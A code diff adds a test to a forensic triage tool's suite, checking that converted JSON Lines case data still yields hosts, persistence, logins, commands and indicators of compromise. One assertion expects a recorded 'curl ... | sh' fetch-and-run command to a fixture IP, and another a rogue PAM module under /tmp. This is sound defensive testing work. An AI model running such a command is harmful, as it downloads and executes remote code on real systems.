@@ -45,6 +45,30 @@ def test_case_answers(tmp_path):
     assert "found nothing" in eru_offline.answer("analysis", path)
 
 
+def as_json_lines(case_dir: str) -> None:
+    """The case as Elrond writes it now: every CSV table as JSON Lines with the envelope."""
+    import csv
+    for path in Path(case_dir).rglob("*.csv"):
+        with open(path, newline="") as fh:
+            rows = list(csv.DictReader(fh))
+        eru_offline.case_files.tables.write_records(path.with_suffix(".jsonl"), rows, host=path.parts[-4],
+                                                    artefact=path.stem, time_field="LastWriteTime")
+        path.unlink()
+
+
+def test_case_answers_from_json_lines(tmp_path):
+    path = case(tmp_path)
+    as_json_lines(path)
+    assert not list(Path(path).rglob("*.csv"))
+    assert "lab-ubuntu**: Linux, 4 processed artefact files" in eru_offline.answer("hosts", path)
+    persistence = eru_offline.answer_with_rows("persistence", path)
+    assert "/tmp/.x/pam_lab.so" in persistence["answer"] and "vboxdrv" not in persistence["answer"]
+    assert [(r["file"], r["row_ref"]) for r in persistence["rows"]] == [("artefacts/cooked/pam.jsonl", "2")]
+    assert "bob (1)" in eru_offline.answer("logins", path)
+    assert "curl http://198.51.100.23/b | sh" in eru_offline.answer("commands", path)
+    assert "198.51.100.23 (×2, watchlist)" in eru_offline.answer("iocs", path)
+
+
 def test_wmi_subscriptions(tmp_path):
     host = tmp_path / "CASE02" / "LAB-WIN11"
     cooked = host / "artefacts" / "cooked"
